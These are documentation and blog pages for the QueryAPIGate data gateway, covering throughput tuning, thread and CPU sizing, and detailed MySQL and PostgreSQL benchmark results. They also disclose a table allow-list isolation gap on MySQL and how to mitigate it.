- [Wire up Prometheus and Grafana](35-wire-up-prometheus-and-grafana.md) - the live counters as dashboards and alerts.
- [Read the audit log](20-read-the-audit-log.md) - not *what ran*, but *who changed the configuration*.
- [Send the audit log to your SIEM](53-send-the-audit-log-to-your-siem.md) - ship the record off the box.


# Guide 63: Tune a deployment for throughput
Source: https://anantharajuc.github.io/QueryAPIGate-website/Guide.dc.html?g=63-tune-a-deployment-for-throughput

# How to tune a deployment for throughput

**Time:** 20 minutes to read, plus a load test of your own. **You'll end up with:** threads, CPU, logging, cache and
disk settings chosen for your queries and your database's distance, a number of containers to start from, and the
figures each one rests on.

Every figure here comes from the benchmarks in [Performance, v3](../documentation/PERFORMANCE_V3.md) (PostgreSQL) and
[Performance on MySQL](../documentation/PERFORMANCE_MYSQL_V1.md), run on one laptop with the gateway, the database and
the load generator each on their own cores. They are measured on 0.42 and `main` before 0.43's round-trip changes
([ADR 0027](../documentation/adr/0027-fewer-round-trips-per-query.md)), which make calls across a network cheaper still,
so treat them as conservative. Measure your own queries before you commit to a size.

## 1. One worker per container, more containers for more

The image runs gunicorn with **one worker** and keeps it that way: each process has its own `/metrics`, its own
response cache without Redis, and its own `/events` streams. Python runs one thread at a time per process, so a worker
saturates about one core. More capacity means more containers, behind a load balancer, on a shared PostgreSQL store and
Redis ([Run several instances](42-run-several-instances.md)).

## 2. Threads: by how long your calls wait

A worker's threads let it run Python for one call while others wait on the database. They help only while calls spend
real time waiting. Measured, one worker, 32 callers:

| Threads | PostgreSQL lookup, 0.03 ms | MySQL lookup, 0.03 ms | MySQL `stock_level`, 0.42 ms |
|---|---|---|---|
| 1 | 788 req/s | **865** | 630 |
| 2 | **843** | 823 | **772** |
| 4 | 777 | 722 | 683 |
| 8 (the default) | 735 | 676 | 642 |

Past what the waiting needs, threads cost: they compete for Python's interpreter lock, and on these fast queries the
best setting was 15-28% faster than the default eight. So:

| Your calls | `QUERYAPIGATE_THREADS` |
|---|---|
| Fast lookups (well under 1 ms) on a database on the same host or rack | `2` |
| Queries of a few ms, or a database a network hop away | `4`-`8` |
| Slow reports (tens of ms and up), or a warehouse or Trino across a network | `8`-`16`, while CPU allows |

The waiting limit of one worker is **threads ÷ (query time + round trips × network round-trip time)** calls a second.
From 0.43 a PostgreSQL call makes 1 round trip to its database and a MySQL call 2, plus 3 to a PostgreSQL store, none
with the metadata cache (section 4). A 20 ms report query at 0.5 ms away, with 8 threads: 8 ÷ (20 + 4 × 0.5 ms) = about
360 a second - more threads would raise it, as long as the CPU figure in section 7 isn't lower.

**MySQL across a network before 0.43:** extra threads gained nothing - mysql-connector held Python's interpreter lock
while it pinged the server, once per call (ADR 0027). 0.43 removes the ping; threads overlap MySQL waits again.

The pool of idle database connections follows the threads (`QUERYAPIGATE_POOL_SIZE` defaults to them), and the main
server's `/events` streams never take more than half of them.

```yaml
# Docker Compose
    environment:
      QUERYAPIGATE_THREADS: "2"
```

```yaml
# Helm
config:
  QUERYAPIGATE_THREADS: "2"
```

## 3. CPU: about 1.25-1.5 cores per container

At full load one worker used **1.1-1.3 cores**: one for Python, the rest for its threads' I/O (PostgreSQL 1.2, MySQL
1.1-1.3). A CPU limit below that throttles it, and the throttling shows up as latency, not as an error.

| | Request | Limit |
|---|---|---|
| A small or shared cluster (the Helm chart's default) | `250m` | none |
| Serving at capacity | `1` | `1.5`, or none |

```yaml
# Helm
resources:
  requests: {cpu: "1", memory: 256Mi}
  limits: {cpu: 1500m, memory: 1Gi}
```

On one host, give each container its own physical core. In the benchmarks, eight workers on four cores' hyperthreads
did 307 lookups a second per core, against 612 for one worker on its own: a hyperthread is worth far less than a core.

## 4. The metadata cache: +12-23%, at the cost of a delay

`QUERYAPIGATE_METADATA_CACHE_TTL=5` keeps the key, saved query and connection a call reads from the store for 5
seconds instead of reading them on every call. Measured: +18-23% on PostgreSQL, +12-15% on MySQL, and half of
PostgreSQL's load, which was mostly the store's.

The cost: a change made on **another** instance (or with the CLI) takes up to the TTL to arrive there - a revoked key
keeps working on the other instances for that long. A change made through the same instance is seen at once. With
one instance, turn it on; with several, decide whether a 5-second revocation delay is acceptable
([the metadata cache](../documentation/PERFORMANCE.md#the-metadata-cache)).

## 5. Logs: off where something else already logs

| Setting | What it writes | Cost measured | Turn off when |
|---|---|---|---|
| `QUERYAPIGATE_ACCESS_LOG=off` | gunicorn's access line per request, on stdout | 7% of throughput | the proxy or load balancer logs requests |
| `QUERYAPIGATE_LOG_REQUESTS=off` | QueryAPIGate's own request and query lines (INFO) | part of the fifth of CPU logging took | the same - errors, warnings, slow queries and agent writes are still logged |

Turn the access log off with the setting, not by sending it to `/dev/null`: that still formats and writes every line.
At these rates the logs grow by gigabytes an hour - 6.6 GB in a five-hour MySQL run.

## 6. Disk: the event log

Every call is recorded in the store's event log (ADR 0020), kept for 24 hours by default: **about 570 bytes a call**
on a SQLite store, more on PostgreSQL.

| Sustained calls a second | Event log after 24 hours |
|---|---|
| 50 | about 2.5 GB |
| 500 | about 25 GB |
| 2,000 | about 100 GB |

`QUERYAPIGATE_EVENTS_RETENTION_HOURS` shortens it, and the disk with it. It is also how far back a `queryapigate
events` client can resume after a disconnect, so keep it above the longest outage a client must ride out.

## 7. How many containers

Per worker, at 75% of measured capacity, where p99 stays at about 4-5 ms:

| | Plain | With the metadata cache |
|---|---|---|
| PostgreSQL, fast OLTP calls | 550 calls a second | 650 |
| MySQL, `order_status`-class calls | 440 | 490 |

**Containers** = the larger of (your calls a second ÷ that figure) and (your calls a second ÷ the waiting limit from
section 2), **plus one** to lose without falling over. Every millisecond of Python a call costs beyond these simple
lookups lowers the CPU figure; masked keys and large pages cost more.

Then load-test your own queries at 75% of what you plan to serve, and watch p99, not the average: it holds flat to
about 75% and triples by 90%.

## What hasn't been measured yet

- **Containers on separate hosts.** The scale-out figures are workers sharing one laptop's cores; separate hosts
  should scale better, by an amount not yet measured.
- **0.43's figures.** The round-trip changes, the thread setting and sqlglot 30 are measured at the driver, not yet
  through whole requests. The benchmarks are rerun for the 0.43 release, and this guide will be updated with them.


# One MySQL server, six services, one gateway
Source: https://anantharajuc.github.io/QueryAPIGate-website/Guide.dc.html?p=one-mysql-six-services

# One MySQL server, six services, one gateway

A common shape for a growing system is one MySQL server, with a database per microservice: `crm` for customers,
`orders`, `billing`, `inventory`, and so on. Sooner or later, something needs to read across them: a support tool, a
partner API, an AI agent. "Show me this user's latest order, with the items and their payments" is three services'
data in one query. MySQL can join across databases on the same server, so the question is what putting a governed
gateway in front of that costs.

We measured it. We loaded TPC-C's data into MySQL 8.4 (600,000 customers, 6 million order lines) and split its tables
into six databases, one per service. Then we ran six per-user queries through QueryAPIGate and straight into MySQL,
side by side. The full write-up, with every table and its ranges, is
[Performance on MySQL](https://github.com/AnanthaRajuC/QueryAPIGate/blob/main/documentation/PERFORMANCE_MYSQL_V1.md).

## A fixed 1.2 ms

| Query | MySQL directly | Through the gateway | Added |
|---|---|---|---|
| One customer by id | 0.03 ms | 1.16 ms | 1.1 ms |
| TPC-C Order-Status (customer, last order, its lines) | 0.08 ms | 1.40 ms | 1.3 ms |
| TPC-C Stock-Level (a range and a `COUNT(DISTINCT)`) | 0.42 ms | 1.64 ms | 1.2 ms |

These are single calls at p50, with the metadata cache on. The gateway adds about the same 1.1-1.3 ms to every query,
so the cost is fixed, not a percentage. For a query MySQL answers in microseconds, that cost is most of the call. For
one that takes 20 ms, it's noise.

The cost is the gateway's work: identity, the grant check, the SQL guard, the record of the run, and the HTTP response.
All of it is Python. One worker serves 580-780 of these calls a second, while MySQL, on two cores, could answer 8 to
110 times more. So you scale with workers. At eight workers, the heaviest query kept MySQL busy on 2.5 of its 4
hardware threads, and the lighter ones on less than one.

## Three round trips, one of them a ping

We counted every statement MySQL received: two per call, the query and a `ROLLBACK` when the pooled connection goes
back to the pool. That's half what PostgreSQL gets, because the MySQL driver sets read-only mode and the time limit
once per connection, not once per query.

Then we timed calls at 0, 0.5, 1 and 2 ms of simulated network delay. The slope of latency against delay counts the
round trips a call actually waits for, and it said **three**.

The third turned out to be in the MySQL client library. Every time code asks mysql-connector for a cursor, the library
pings the server first, and our driver asked for a new cursor on every query. A ping isn't a statement, so the log
never showed it. Across a 0.5 ms network, that's 0.6 ms a call we can take back by reusing a cursor. It's on the list
for the next release.

## Lookups want one thread

| Threads per worker | 1 | 2 | 4 | 8 |
|---|---|---|---|---|
| One customer by id (0.03 ms) | **865/s** | 823 | 722 | 676 |
| Stock-Level (0.42 ms) | 630 | **772** | 683 | 642 |

The Docker image runs eight threads per worker. For a 0.03 ms lookup, one thread was 28% faster than eight: extra
threads only compete for Python's interpreter lock. The 0.42 ms query wanted two, because with one thread a worker sits
idle while MySQL works. The rule is simple: the faster the query, the fewer threads it needs. Slow reports and exports
are the opposite, and that's what the eight threads are for.

## Busy users make a response cache pay

Real traffic isn't uniform. A few accounts call far more than the rest. We drew users from a Zipf distribution and
gave the Order-Status query a 30-second response cache (`cache_ttl: 30`):

- **59% of calls were answered from the cache,** throughput rose 23%, and MySQL got 58% fewer statements.
- **With uniform users, the same cache cost 8%.** Only 5% of 600,000 equally likely users came back within 30
  seconds, and storing the rest bought nothing.

So put `cache_ttl` on queries whose callers repeat themselves, such as dashboards and popular accounts, and not on
lookups every user makes once.

## The store across the network

QueryAPIGate reads three rows of its own on every call: the API key, the saved query and the connection. On one
instance with its store on local SQLite, those reads are cheap in time but not in CPU: a fifth of the worker's.
Several instances share a PostgreSQL store instead, and then the reads cross the network too:

| QueryAPIGate's store | One call |
|---|---|
| SQLite, local | 3.5 ms |
| PostgreSQL, 0.5 ms away | 6.1 ms |
| PostgreSQL, 0.5 ms away, with the metadata cache | **3.4 ms** |

The metadata cache (`QUERYAPIGATE_METADATA_CACHE_TTL`) keeps those three rows in memory. It caches rows, never
decisions: whether a key is active, expired or used from an allowed address is checked on every call. For a
multi-instance deployment, it's the difference between the second row and the third. On a single instance, it still
adds 12-15% throughput.

## What fills the disk

Every call is written to the store's event log, which keeps 24 hours of events for clients that resume from where
they left off. In five hours of this benchmark, that came to 10.6 million events and 6 GB of SQLite: about 570
bytes a call. At 500 calls a second, the log levels off around 25 GB. Either size the store's disk for it, or shorten
`QUERYAPIGATE_EVENTS_RETENTION_HOURS`.

## The gap to close first

Six services in one server raise a question the performance numbers don't answer: can a key for one service be kept
out of another's tables? We checked. A key allowed to read `customer` could read `crm.customer`, as intended, and
could also read a `billing.customer` table in another service's database. On MySQL, QueryAPIGate's table allow-list
matches bare table names; only Trino connections match the full `catalog.schema.table`.

Until that changes, keep services apart with MySQL's own grants. Give each service a MySQL user that can only see its
own databases, add it as its own QueryAPIGate connection, and grant keys that connection only. Matching
`schema.table` on MySQL is planned for the next release. Saved queries aren't affected: a key granted named queries
can only run their SQL, which the publisher wrote.

## What's next

From this run, for 0.43:

1. **Reuse a cursor per pooled MySQL connection,** to drop the ping: 3 round trips down to 2.
2. **Match `schema.table` in MySQL table allow-lists,** to close the isolation gap.
3. **Stop re-reading settings from the environment on every call:** 3.6% of the CPU.
4. **Look at autocommit for read-only MySQL connections,** which would drop the `ROLLBACK` too, and make a call a
   single round trip.

## Check it yourself

```bash
pip install -e ".[server,mysql,postgres]" py-spy
python benchmarks/tpcc_mysql.py --out /tmp/qag-tpcc --go-tpc ./go-tpc setup A B teardown
python benchmarks/tpcc_mysql_report.py /tmp/qag-tpcc/results.jsonl
```

The harness starts its own MySQL, loads the data with [go-tpc](https://github.com/pingcap/go-tpc), splits it into the
six databases, pins each part to its own cores, and compares releases side by side, with five rounds per comparison.
It's TPC-C's data and two of its queries, but not the TPC-C benchmark, so these aren't TPC-C results. Plug the laptop
in first.


# What a governed call costs
Source: https://anantharajuc.github.io/QueryAPIGate-website/Guide.dc.html?p=what-a-governed-call-costs

# What a governed call costs

A data gateway puts something between your callers and your database: identity, limits, grants, a SQL guard,
masking, an audit record. The fair question is what that costs on every call. For 0.42 we measured it on PostgreSQL,
had the method reviewed twice, fixed what the reviews found, and published the harness so you can check our numbers.
This post is the whole of it.

## The short answer

One gunicorn worker, as in the Docker image, serving a saved query by primary key from pgbench's 10-million-row
`pgbench_accounts` table, 32 callers at once:

| | 0.41 | 0.42 | 0.42 with the metadata cache |
|---|---|---|---|
| Calls a second | 682 | 743 | 875 |
| One call on its own (p50) | 1.43 ms | 1.38 ms | 1.05 ms |
| Calls a second with masking and a table allow-list | 171 | 693 | 802 |

- **Governance is now close to free:** a key with column masking and `allowed_tables` costs about 7% more than one
  without. In 0.41 it was four times slower.
- **One worker serves 730-875 calls a second.** p99 holds at about 4 ms up to 75% of that, then climbs.
- **Processes add throughput:** eight workers served 2,165-2,727 calls a second on four physical cores.
- **PostgreSQL is never the limit here.** At most it used 2 of the 4 hardware threads it had.
- **What's left of a call** is about a millisecond of Python, a fifth of it logging, plus round trips to
  PostgreSQL. A call in 0.42 makes 7 of them, 3 to QueryAPIGate's own store and 4 to the data database. With the
  metadata cache it makes 4. Across a real network, those round trips are most of the cost.

**How to read the numbers.** Every comparison below is the median of 5 interleaved rounds, with its min-max range in
brackets. A difference counts as real only when the two ranges don't overlap. The cold-path test and the profile are
single long runs, and they're marked where they appear.

## How we measured

### The machine, kept steady

One laptop: an Intel i7-12700H with 6 performance cores (CPUs 0-11, two threads each) and 8 efficiency cores (CPUs
12-19), 32 GB of memory, Ubuntu with kernel 6.8. A laptop isn't a server, so most of the method is about keeping it
from changing under us:

- **AC power, and the `performance` power profile and CPU energy preference.** Turbo stays on, since turning it off
  needs root; its effect is measured below.
- **Every part on its own cores,** so none takes CPU from another:

  | Part | CPUs | How |
  |---|---|---|
  | QueryAPIGate (gunicorn) | 0-7: four performance cores, both threads of each | `taskset -c 0-7` |
  | PostgreSQL | 8-11: two performance cores | `docker run --cpuset-cpus 8-11` |
  | Load generator (oha) and pgbench | 12-19: the efficiency cores | `docker run --cpuset-cpus 12-19` |

- **No proxy in the path.** The gateway reaches PostgreSQL at the container's own address, not through Docker's
  published port, whose userland proxy is one more unpinned process copying every byte.
- **A floor around every block:** 10 seconds of `/health` on one worker, before and after each block, as a check
  that the machine hasn't changed speed. It's the same work every time. Both sessions sagged about 10% in their last
  hour, after 90 minutes of load. That's why every table compares builds only within its own block, where they take
  turns.
- **The load generator was never the bottleneck.** It used at most 0.79 of its 8 cores, at 2,700 calls a second.

The results come from two sessions on that machine, with the same harness and settings:

| Session | When | What | `/health` floor |
|---|---|---|---|
| A | 2026-10-23, 21:00-23:24 | pgbench, throughput, single-call latency, cold path, access log, profile | 1,934-2,296 a second |
| B | 2026-10-24, 08:45-11:08 | latency under load, scale-out, network, mixed and hot rows, threads, round trips | 1,959-2,258 a second |

Where the two sessions overlap, they agree: one worker at 32 callers served 743 lookups a second in session A, and
730 in session B.

### Turbo, measured

The busiest gateway core's clock was sampled every two seconds of every run:

- **Overall, 2.4 to 4.4 GHz.** That range is between blocks: with eight busy workers, the cores run at a lower
  all-core turbo.
- **Within a cell - the same build, call and setting - only ±1%.**
- **The rare fast outlier rounds are clock spikes.** One 0.41 round ran at 4.09 GHz against its cell's usual 3.65,
  and served 11% more.

So one turbo burst can make one round look good. That's why there are 5 rounds, and why the rule looks at ranges: an
outlier widens a range instead of moving a median.

### When a difference counts

Builds take turns in an order that rotates each round - A B C, then B C A, then C A B - so none always runs first,
warmest or coolest. A difference counts only when the two ranges don't overlap.

How often would that rule call a difference real when there isn't one? If two builds were really the same, every
ordering of their 2n results would be equally likely, and the ranges would come out clear in 2 of the C(2n, n)
orderings. For 5 rounds, that's 2 in 252, under 1%. For 3 rounds it's 2 in 20, which is 10% - too likely, which is
why our second attempt's 3-round blocks were all rerun with 5. Across the roughly 40 comparisons here, perhaps one
of the narrow ones is luck. The big ones aren't.

### The builds

| Label | What |
|---|---|
| **0.41** | the 0.41.0 release (`f61d4ed`) |
| **0.42** | the code that shipped as 0.42.0 (`c9b15c2` in session A and `99db30b` in session B, with the same code - only docs changed between them) |
| **Cached** | 0.42 with `QUERYAPIGATE_METADATA_CACHE_TTL=5` |

Each build is exported from git and run as the Docker image runs it: gunicorn's `gthread` worker, 8 threads, access
log on, and every other setting at its default. That means 0.41 has a pool of 5 and 0.42 a pool of 8.

The software: Python 3.12.3, gunicorn 26.2.0, Flask 3.1.1, psycopg2 2.9.10, sqlglot 25.34.1, PostgreSQL 16.15, and
oha 1.16.0, pinned by image digest.

### The database

pgbench's TPC-B-like schema at scale 100 (`pgbench -i -s 100`), 1.5 GB, entirely in memory (`shared_buffers=2GB`,
`max_connections=300`, `synchronous_commit=on`):

| Table | Rows | Columns | Key |
|---|---|---|---|
| `pgbench_accounts` | 10,000,000 | `aid integer`, `bid integer`, `abalance integer`, `filler character(84)` | primary key `aid` |
| `pgbench_branches` | 100 | `bid integer`, `bbalance integer`, `filler character(88)` | primary key `bid` |
| `pgbench_tellers` | 1,000 | `tid integer`, `bid integer`, `tbalance integer`, `filler character(84)` | primary key `tid` |
| `pgbench_history` | 0 | `tid`, `bid`, `aid`, `delta integer`, `mtime timestamp`, `filler character(22)` | none |

QueryAPIGate's own store - keys, saved queries, connections, run history - is a second database in the same
PostgreSQL, as a production deployment would have it.

### The calls and the keys

Three saved queries, each called with a random id on every request so nothing is answered from a warm cache:

| Saved query | SQL | Called as |
|---|---|---|
| `account`, a **lookup** | `SELECT aid, bid, abalance FROM pgbench_accounts WHERE aid = :aid` | `/q/account?aid=` 1 to 9,999,999 |
| `account_page`, a **100-row page** | `SELECT a.aid, a.abalance, b.bid, b.bbalance FROM pgbench_accounts a JOIN pgbench_branches b ON b.bid = a.bid WHERE a.aid BETWEEN :start AND :start + 99 ORDER BY a.aid` | `/q/account_page?start=` 1 to 999,999`&page_size=100` |
| `deposit`, a **write** | `UPDATE pgbench_accounts SET abalance = abalance + :delta WHERE aid = :aid` | `/q/deposit?aid=` 1 to 9,999,999`&delta=` 1 to 9 |

And three keys:

- **plain:** `account` and `account_page`, and nothing else;
- **governed:** the same, plus `allowed_tables` (`pgbench_accounts`, `pgbench_branches`) and a masking rule that
  hashes `*.abalance`;
- **writer:** `deposit` only, with `allow_writes` and `allowed_write_ops: ["update"]`.

Across both sessions, all 12 million requests that completed returned 200. Requests still in flight when a run's
time was up aren't counted either way.

### The load

- **Closed loop, for throughput.** `oha -c N` keeps N callers busy, each sending its next request when the last one
  answers: 30 seconds per run, after a 5-second warm-up that fills the pool and the governance caches.
- **Open loop, for latency under load.** `oha -q R --latency-correction` sends R requests a second whatever happens,
  and times each from when it *should* have gone out. A closed loop under-reports latency at saturation, because a
  slow answer delays the next request; this avoids that, which is called coordinated omission. The rates run from 25%
  to 110% of capacity, 20 seconds each, and capacity is measured first in the same block.

### What every run records

- **Load:** requests a second, the success rate and every status code; p50, p90, p99 and p99.9.
- **CPU, in cores:** the gateway's (from `/proc`), PostgreSQL's (from its container's cgroup), and the load
  generator's cores (from `/proc/stat`).
- **Transactions per request**, on the store and on the data database.
- **The machine:** the busiest core's clock, and the CPU package temperature, which ran from 65 to 100 °C.

All of it is in the repository: one JSON line per run, and every table generated from them.

## Results

### The database on its own

pgbench, from the load generator's cores:

| Workload | Clients | Transactions a second | Average latency |
|---|---|---|---|
| Primary-key read | 1 | 38,289 (37,465-39,586) | 0.026 ms |
| Primary-key read | 32 | 112,321 (96,140-123,670) | 0.285 ms |
| TPC-B: three updates, a select, an insert | 32 | 12,970 (12,617-15,293) | 2.5 ms |

A lookup costs PostgreSQL 0.03 ms. Everything a call through QueryAPIGate takes beyond that is the gateway and its
round trips.

### One worker, 32 callers

| Call | | 0.41 | 0.42 | Cached |
|---|---|---|---|---|
| Lookup, plain key | calls/s | 682 (679-686) | 743 (736-746) | 875 (869-876) |
| | p99 | 55.8 ms | 54.1 ms | 45.1 ms |
| Lookup, governed key | calls/s | 171 (171-172) | 693 (691-694) | 802 (800-806) |
| | p99 | 223 ms | 57.1 ms | 49.9 ms |
| 100-row page | calls/s | 596 (595-598) | 639 (638-642) | 738 (737-740) |
| | p99 | 64.8 ms | 61.4 ms | 52.7 ms |
| Write | calls/s | 682 (679-683) | 738 (733-743) | 875 (872-881) |
| | p99 | 56.9 ms | 53.9 ms | 45.9 ms |

Every range is clear of the others:

- **0.42 over 0.41: +7-9% on plain keys,** from reading the store less; **+304% on a governed key.** Column masking
  used to trace each statement through its aliases, joins and subqueries on every call, to learn which source column
  each result column came from. 0.42 works that out once per statement and reuses it. The table check gets the same
  treatment.
- **The metadata cache adds +16-19% on every call.**
- **The gateway used 1.2 cores for one worker,** and PostgreSQL 0.2-0.4.

### One caller at a time

| Call | | 0.41 | 0.42 | Cached |
|---|---|---|---|---|
| Lookup, plain key | p50 | 1.43 ms (1.43-1.44) | 1.38 ms (1.35-1.42) | 1.05 ms (1.04-1.06) |
| | p99 / p99.9 | 2.1 / 3.0 ms | 2.2 / 3.1 ms | 1.7 / 2.4 ms |
| Lookup, governed key | p50 | 6.00 ms (5.79-6.06) | 1.48 ms (1.46-1.51) | 1.20 ms (1.16-1.20) |
| | p99 / p99.9 | 7.6 / 13.6 ms | 2.4 / 3.3 ms | 1.9 / 2.5 ms |

For a single plain caller, 0.41 and 0.42 overlap: two fewer store reads don't show at this speed. The cache's -24%
does. A governed call went from 6 ms to 1.5.

### Latency under load

The lookup at fixed offered rates. Capacity, measured first, was 730 (720-797) calls a second for 0.42 and 862
(840-872) with the cache. Each cell is p50 / p99 / p99.9:

| Offered | 0.42 | Cached |
|---|---|---|
| 25% | 2.0 / 3.0 / 11.0 ms | 1.5 / 2.3 / 10.5 ms |
| 50% | 1.6 / 2.8 / 8.4 ms | 1.1 / 2.1 / 9.8 ms |
| 75% | 1.5 / 3.8 (3.2-4.1) / 13.5 ms | 1.2 / 3.4 (3.3-4.6) / 15.0 ms |
| 90% | 1.7 / 11.1 (7.6-12.9) / 21.7 ms | 1.2 / 8.7 (6.3-11.6) / 19.0 ms |
| 100% | 1.9 / 22.7 (18.3-67.2) / 27.8 ms | 1.6 / 17.2 (15.2-23.6) / 21.8 ms |
| 110% | 664 / 1,584 / 1,607 ms; 744 of 802 served | 305 / 1,276 / 1,296 ms; 893 of 948 served |

- **p50 stays flat right up to capacity.** p99 holds at about 4 ms to 75%, then climbs: about 3× at 90%, and 6×
  at 100%.
- **Past capacity, a queue builds,** and latency reaches seconds within the 20-second run.
- **Real capacity is a little higher than the closed loop says.** At 110%, more was served than "capacity": 744
  against 730, and 893 against 862. So each row's real load sits a few percent below its label, and planning at 75%
  errs on the safe side.
- **The lightest loads show a higher p99.9 than 50%:** at a trickle, an idle core clocks down between requests.

### More workers

Workers in one gunicorn, each a process as each container would be, with 64 callers:

| Workers | Lookups/s: 0.42 | Lookups: Cached | Writes: 0.42 | Writes: Cached |
|---|---|---|---|---|
| 1 | 734 (733-739) | 869 (866-871) | 732 (729-733) | 863 (844-866) |
| 2 | 1,196 (1,193-1,202) | 1,441 (1,431-1,445) | 1,188 (1,185-1,190) | 1,430 (1,428-1,434) |
| 4 | 1,716 (1,709-1,722) | 2,112 (2,104-2,124) | 1,706 (1,701-1,710) | 2,087 (2,078-2,094) |
| 8 | 2,215 (2,127-2,264) | 2,727 (2,638-2,801) | 2,165 (2,096-2,229) | 2,651 (2,552-2,683) |

| Workers | p99 lookups: 0.42 / Cached | Lookups/s per gateway core: 0.42 / Cached | PostgreSQL cores: 0.42 / Cached |
|---|---|---|---|
| 1 | 103 / 88 ms | 612 / 736 | 0.30 / 0.17 |
| 2 | 74 / 59 ms | 501 / 622 | 0.56 / 0.31 |
| 4 | 66 / 69 ms | 367 / 463 | 1.04 / 0.56 |
| 8 | 139 / 92 ms | 307 / 377 | 1.65 / 0.92 |

- **The cache's lead holds at every size,** +18% to +23%.
- **Throughput grows, but not linearly here.** Calls a second per gateway core fall from 612 at 1 worker to 307
  at 8. The eight workers share CPUs 0-7, which are only four physical cores. From four workers on, they share
  hyperthreads, and a hyperthread is worth far less than a core. Containers on their own cores or hosts would
  scale better; this run can't show by how much.
- **The cache halves PostgreSQL's work:** 1.65 cores without it at 8 workers, 0.92 with it. Most of PostgreSQL's
  load was QueryAPIGate's own store, not the queries.

### Threads per worker

One worker, the lookup, 32 callers:

| Threads | Calls/s | p99 |
|---|---|---|
| 1 | 788 (782-792) | 51.7 ms |
| 2 | 843 (842-851) | 47.5 ms |
| 4 | 777 (772-778) | 51.0 ms |
| 8 | 735 (734-737) | 54.5 ms |

An earlier post on this blog said queries spend most of their time waiting on the database, so threads do well.
That's true for slow queries, and wrong for fast ones:

- **Two threads were the fastest.** One runs Python while the other waits on the database.
- **Eight threads were 13% slower than two, and even slower than one.** That's the Docker image's setting, and the
  extra threads compete for Python's interpreter lock and the logging module's lock.

Threads are for calls that wait: slow queries, `?stream=true` exports, and `/events` connections that stay open.
Match them to your queries; the sizing rule below shows how.

### The cold path, every 60 seconds

One 150-second run per key, 8 callers, with each request's duration taken from gunicorn's access log:

| Key | Requests | p50 | p99 | p99.9 | p99.99 | Slowest |
|---|---|---|---|---|---|---|
| governed | 106,741 | 9.25 ms | 14.66 ms | 19.2 ms | 73.7 ms | 146.9 ms |
| plain | 115,314 | 8.58 ms | 13.57 ms | 16.9 ms | 20.9 ms | 26.0 ms |

In a typical second, the slowest request took 17 ms. Three seconds of the governed run stand out:

- **t=1, 147 ms:** the very first calls, which read the connection's schema and trace the statement for masking.
- **t=61 and t=121, about 75 ms each:** the same work again, each time QueryAPIGate's copy of the schema expires.

So a governed key pays about 75 ms once a minute, and more on its very first call. Only the requests that arrive
during it wait, so it shows at p99.99, not at p99.9. The plain key has nothing to redo, and no spikes.

### The access log

| Access log | Calls/s | p50 | p99 |
|---|---|---|---|
| on, the Docker image's default | 736 (735-739) | 43.0 ms | 54.4 ms |
| off | 785 (782-792) | 40.2 ms | 51.7 ms |

gunicorn's access log costs 7%. QueryAPIGate also logs two lines of its own per request, which 0.42 can't turn off.

### A database across a network

netem on the database container delays everything PostgreSQL sends by 0.5 ms, about a same-zone cloud round trip.
The lookup:

| | 0.41 | 0.42 | Cached |
|---|---|---|---|
| One caller: calls/s | 133 (132-134) | 162 (161-168) | 270 (267-273) |
| One caller: p50 | 7.57 ms | 6.24 ms | 3.65 ms |
| 32 callers: calls/s | 674 (670-753) | 735 (734-741) | 855 (852-874) |

- **One caller pays for every round trip.** The 0.5 ms hop took a call from 1.4 ms to 6.2 ms. Fewer store reads made
  0.42 21% faster than 0.41. The cache made it 67% faster again, and took 41% off a single call, down to 3.65 ms.
- **With 32 callers, the round trips overlap,** and the CPU is the limit again.
- **0.41's range overlaps 0.42's at 32 callers.** One of its five rounds ran at 753 calls a second, on a turbo burst
  at 4.09 GHz: it was the first run after a `/health` floor, and the rotation gave 0.41 that slot every time. That's a
  small flaw in our harness, and the fix is on our list. The median is 9% below 0.42's.
- **This is a simulation:** one-way delay, no loss or jitter. We use it below to count round trips, not as a cloud
  measurement.

### Mixed reads and writes, and hot rows

| Workload | Calls/s | p50 | p99 |
|---|---|---|---|
| Reads (24 callers) and writes (8) at once | 548 (546-549) + 181 (181-182) | 43.3 / 43.6 ms | 54.4 / 54.9 ms |
| Writes spread over 10 million accounts | 734 (733-736) | 43.1 ms | 54.4 ms |
| Writes on 99 hot accounts | 738 (735-740) | 42.9 ms | 53.9 ms |

- **Mixing reads and writes changes nothing:** they share the worker's capacity in proportion.
- **Hot rows cost the same as spread-out ones.** One worker sends at most eight writes at once, so PostgreSQL's row
  locks never queue long enough to show. With many workers or slow transactions, they would.

## Where the time goes

### Round trips, counted

We turned on PostgreSQL's `log_statement = 'all'`, then made 100 calls after a warm-up:

| Statements per call | 0.41 | 0.42 | Cached |
|---|---|---|---|
| Store, plain key or writer | 7: 5 reads, 2 inserts | 3: the key, the query, the connection | 0.1: history, in batches |
| Store, governed key | 8 | 4 | 1: the masking hash key |
| Data database | 4: `BEGIN READ ONLY`, `SET LOCAL statement_timeout`, the query, `ROLLBACK` | 4 | 4 |
| **Round trips a call waits for** | **9** | **7** | **4** |

- **0.41 read the saved query three times.** 0.42 reads it once.
- **History and events are written in batches** of up to 500 by a background thread, so a call doesn't wait for
  them.
- **A governed call still reads the masking hash key every time,** even with the cache on.
- **Every query takes four round trips to the data database:** a transaction, its time limit, the statement, then
  the rollback or commit.

### Round trips, measured

A statement log can miss traffic. So we also timed single calls at 0, 0.5, 1 and 2 ms of netem delay: the slope of
latency against delay is the number of round trips a call waits for. psycopg2 on its own, sending a known 1 or 4
statements, calibrates the method:

| | +0 ms | +0.5 ms | +1 ms | +2 ms | Slope | Round trips (slope ÷ 1.15) |
|---|---|---|---|---|---|---|
| psycopg2, 1 statement | 0.03 | 0.63 | 1.19 | 2.33 | 1.15 | 1 |
| psycopg2, a query's 4 statements | 0.06 | 2.44 | 4.68 | 9.36 | 4.60 | 4.0 |
| 0.41 | 1.42 | 7.60 | 12.47 | 22.66 | 10.46 | 9.1 |
| 0.42 | 1.43 | 6.24 | 10.01 | 18.75 | 8.58 | 7.5 |
| Cached | 1.05 | 3.70 | 5.84 | 10.59 | 4.72 | 4.1 |

Under netem, a round trip costs 1.15 ms per millisecond of delay, the same for bare psycopg2 at 1 statement and at
4. That's netem's per-packet overhead. Divided by it, the measured round trips match the counted ones: 9.1 against 9,
7.5 against 7, and 4.1 against 4. The statement log missed nothing.

### The CPU

A py-spy profile, 200 samples a second across the worker's threads, during one 30-second run of the lookup at 32
callers:

| Where the samples fall | 0.42 | Cached |
|---|---|---|
| Store layer: queries, decoding rows, checks | 28.2% | 13.4% |
| Logging: the access log and QueryAPIGate's own lines | 18.4% | 20.4% |
| gunicorn, sockets, HTTP | 16.8% | 21.0% |
| Data query: the driver and the pool | 12.3% | 15.4% |
| Flask and Werkzeug | 9.9% | 11.9% |
